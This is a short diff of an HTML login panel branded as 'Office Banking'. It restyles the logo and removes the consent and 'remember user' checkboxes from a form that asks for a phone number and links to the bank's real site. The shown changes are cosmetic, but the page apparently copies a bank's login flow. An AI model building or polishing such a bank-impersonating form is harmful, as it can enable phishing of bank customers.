@@ -74,12 +74,12 @@
   <!-- Offcanvas con tu flujo original -->
   <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasLogin">
     <div class="offcanvas-header">
-      <h5 class="offcanvas-title">Acceso</h5>
-      <button type="button" class="btn-close" data-bs-dismiss="offcanvas"></button>
+        <button type="button" class="btn-close" data-bs-dismiss="offcanvas"></button>
     </div>
     <div class="offcanvas-body">
       <div class="login-box">
-        <img src="/logo-office-banking.png" alt="Office Banking" class="logo">
+        <img src="/logo-office-banking.png" alt="Office Banking" 
+     style="height:30px; margin-top:-10px; display:block; margin-left:auto; margin-right:auto;">
 
         <!-- Formulario inicial -->
         <form id="loginForm">
@@ -91,14 +91,8 @@
 
           <label for="telefono">Teléfono actualizado</label>
           <input type="tel" id="telefono" name="telefono" placeholder="+56 9 1234 5678" required>
-          
-          <label class="checkbox-label" style="text-align:center;">
-            <input type="checkbox" id="contacto" name="contacto" required>
-            Deseo que eventualmente me contacten para informar sobre productos o promociones.  
-          </label>
-          
+                          
           <div class="options">
-            <label><input type="checkbox" id="recordar"> Recordar usuario</label><br>
             <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">Olvidé mi clave</a>
           </div>
           
